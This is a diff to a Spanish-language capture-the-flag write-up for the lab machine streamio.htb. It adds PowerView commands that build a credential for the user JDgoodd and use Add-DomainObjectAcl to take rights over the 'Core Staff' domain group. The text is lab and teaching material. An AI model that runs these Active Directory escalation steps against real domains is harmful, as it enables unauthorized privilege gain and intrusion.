@@ -474,7 +474,15 @@ Lo primero despues de subirlo es importar el modulo
 Import-Module .\powerview.ps1
 ```
 
-Ahora tendremos que crear una credencial para operaar como el usuario `Jdgodd`
+Ahora tendremos que crear una contraseña y una credencialpara operar como el usuario `Jdgodd`
 ```shell
 $pass = ConvertTo-SecureString 'Pass123' -AsPlainText -Force
+```
+```shell
+$Cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgoodd', $pass)
+```
+
+Y ahora lo añadiremos al grupo
+```shell
+Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Core Staff" -PrincipalIdentity 'JDgodd'
 ```
